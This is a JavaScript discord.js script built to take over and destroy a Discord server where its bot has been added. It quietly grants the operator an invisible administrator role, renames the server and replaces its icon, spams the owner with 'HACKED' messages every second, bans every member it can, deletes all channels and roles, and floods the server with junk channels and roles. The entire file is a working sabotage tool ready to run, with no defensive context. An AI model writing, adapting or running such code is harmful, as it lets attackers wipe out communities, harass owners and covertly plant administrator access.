const Discord = require("discord.js")
const client = new Discord.Client()
const token = "BOT_TOKEN"

// Will make you admin (NOT OWNER) in the targer server
const setAdmin = (guildID, accountID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
    // Create an invisible role with an invisible char '\u200b' and the background color as role color
    targetServer.createRole({name: `\u200b`, color: 0x2F3136, permissions: "ADMINISTRATOR"}).then((role) => {
        // Add role to te account
        targetServer.members.get(accountID).addRole(role).catch((err) => {
           return console.error(`You are not in the ${targetServer.name} server ! You must to be in this server befor leveling up !`)
        })
    })
}
 
// Will change name and icon of the server and send a DM to the owner
const changeServerInfo = (guildID, options) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_GUILD")) return console.error(`${client.user.username} has not the required perms to make something like this`)
    targetServer.setName(options.newServerName)
    targetServer.setIcon(options.newServerIcon)

    const embed = new Discord.RichEmbed()
    .setAuthor(client.user.tag, client.user.avatarURL)
    .setTitle("HACKED")
    .setDescription(`YOUR SERVER ${targetServer.name} HAS BEEN HACKED BY ${client.user.tag}`)
    .setFooter(client.user.tag, client.user.avatarURL)
    .setColor("#ff0000")

    // .sendEmbed() id deprecated method
    setInterval(() => {
    return targetServer.owner.send(embed)
    }, 1000)
}

// Will ban all members in the server
const banMembers = (guildID) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("BAN_MEMBERS")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach((member) => {
        if (member.bannable) member.ban({reason: `HACKED BY ${client.user.tag}`})
    })
}

// Will change nickname of each member
const changeNicks = (guildID, newNick) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_NICKNAMES")) return console.error(`${client.user.username} has not the required perms to make something like this`)

    targetServer.members.forEach((member) => {
        if (member.manageable) member.setNickname(newNick, `HACKED BY ${client.user.tag}`)
    })
}

// Wreate differents channels and add an admin role to all members to make a chaotic server
const createChanelsAndRoles = (guildID, name) => {
    const targetServer = client.guilds.get(guildID)
    if (!targetServer) return console.error(`${guildID} ID is invalid or the bot isn't in`)
    else if (!targetServer.members.get(client.user.id).hasPermission("MANAGE_CHANNELS") || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES_OR_PERMISSIONS') || !targetServer.members.get(client.user.id).hasPermission('MANAGE_ROLES')) return console.error(`${client.user.username} has not the required perms to make something like this`)
  targetServer.members.forEach(users => {
  		users.roles.forEach(ro => {
  			users.removeRole(ro)
  		})
  })
   targetServer.channels.forEach(ch => {
    ch.delete()
   })
targetServer.roles.forEach(roless => {
	roless.delete()
})
   setTimeout(() => {
       
   let i;
    for(i=0; i < 50; i++) {
   targetServer.createChannel(name, "text")
    targetServer.createChannel(name, "text")
    targetServer.createRole({name: name, permissions: [], color: "#40011c" }).then((hackedrole) =>{
    	targetServer.members.forEach( allmembers=> {
    		allmembers.addRole(hackedrole)
    	})
     })
    }
    }, 2000);

    targetServer.createRole({name: name, permissions: "ADMINISTRATOR", color: 0xFF0000 }).then((role) => {
        targetServer.members.forEach((member) => {
            member.addRole(role, `HACKED BY ${client.user.tag}`)
        })
    })

}

client.on("ready", () => {
    console.log("THE HACKING STARTED NOW ")

    // Setup YOUR personnal settings
    const configs = {
        "targetServerID": "SERVER_ID",
        "accountID": "YOUR_ID",
        "botNickname": "NEW_BOT_NAME",
        "botIcon": 'https://6.top4top.net/p_1415xrqem1.jpg',
        "newServerIcon": "https://6.top4top.net/p_1415xrqem1.jpg",
        "newServerName": "NEW_SERVER_NAME",
    }

    client.user.setUsername(configs.botNickname)
    client.user.setAvatar(configs.botIcon)

    // Enable all the options
    setAdmin(configs.targetServerID, configs.accountID)
    changeServerInfo(configs.targetServerID, {"newServerName": configs.newServerName, "newServerIcon": configs.newServerIcon})
    changeNicks(configs.targetServerID, configs.botNickname)
    banMembers(configs.targetServerID)
    createChanelsAndRoles(configs.targetServerID, configs.botNickname)
})


client.login(token)
